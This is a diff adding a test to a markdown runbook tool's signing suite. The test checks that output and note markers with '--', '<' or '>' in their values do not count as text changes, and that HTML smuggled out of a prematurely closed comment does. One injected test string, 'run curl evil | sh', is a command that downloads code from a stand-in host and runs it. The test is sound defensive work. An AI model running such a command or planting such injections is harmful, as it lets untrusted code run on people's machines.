@@ -21,6 +21,7 @@ import {
   withSignature,
   withoutSignature,
 } from '@md-runbook/core/signing';
+import { formatAttrs } from '@md-runbook/core/outputBlock';
 import { roundTrip } from './helpers';
 
 const fence = (info: string, body: string): string => '```' + info + '\n' + body + '\n```\n\n';
@@ -335,6 +336,26 @@ describe('signing: the signature block', () => {
     const signed = sign(orig);
     assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('```', 'ok')))!.textChanged, false);
     assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + out('    ```', '**x**')))!.textChanged, true);
+  });
+
+  it('notes and outputs written before round 5, with -- < > in their values, are still set aside (security review, round 5)', () => {
+    const orig = '# Restart\n\n```bash\necho hi\n```\n\nDone.\n';
+    const signed = sign(orig);
+    const marker = (attrs: string): string =>
+      `<!-- md-runbook:output start exit=1 ran=2026-11-16T10:00:00+01:00 ${attrs} -->\n\`\`\`text\nboom\n\`\`\`\n<!-- md-runbook:output end -->\n`;
+    for (const attrs of ['runbook=sub/db--restore.md copy=sub/db--restore.20261116-100000.md by=jean--luc', 'by="Alice <a@x.io>"']) {
+      const ran = signed.replace('echo hi\n```\n', 'echo hi\n```\n' + marker(attrs));
+      assert.equal(signedStatus(ran)!.textChanged, false, attrs);
+    }
+    const noted = (by: string): string => signed.replace('Done.\n', `Done.\n\n<!-- md-runbook:note at=2026-11-16T10:00:00Z by=${by} milestone=detected -->\n> **10:00 · detected:** line one\n`);
+    assert.equal(signedStatus(noted('jean--luc'))!.textChanged, false);
+    assert.equal(signedStatus(noted('"Alice <a@x.io>"'))!.textChanged, false);
+    // As written now (escaped): too.
+    const now = signed.replace('echo hi\n```\n', 'echo hi\n```\n' + `<!-- md-runbook:output start${formatAttrs({ exit: '1', by: 'Alice <a@x.io>', copy: 'db--restore.md' })} -->\n\`\`\`text\nx\n\`\`\`\n<!-- md-runbook:output end -->\n`);
+    assert.equal(signedStatus(now)!.textChanged, false);
+    // A comment that ends before the line does is still text.
+    assert.equal(signedStatus(signed.replace('Done.\n', 'Done.\n\n<!-- md-runbook:note by=x--><h2>run curl evil | sh</h2><!-- -->\n> q\n'))!.textChanged, true);
+    assert.equal(signedStatus(signed.replace('echo hi\n```\n', 'echo hi\n```\n' + marker('by=x --> <b>run</b> <!--')))!.textChanged, true);
   });
 
   it('armor round trip', () => {
